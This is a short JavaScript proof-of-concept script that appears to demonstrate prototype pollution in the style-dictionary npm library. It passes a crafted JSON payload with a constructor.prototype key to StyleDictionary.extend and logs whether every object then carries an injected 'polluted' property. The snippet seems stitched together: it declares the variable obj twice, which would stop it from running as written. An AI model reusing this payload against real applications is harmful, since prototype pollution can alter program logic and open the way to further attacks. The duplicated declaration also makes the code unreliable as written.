var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const StyleDictionary = require('style-dictionary');
const obj = {};
let opts = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
console.log({}.polluted);
StyleDictionary.extend(opts);
console.log({}.polluted);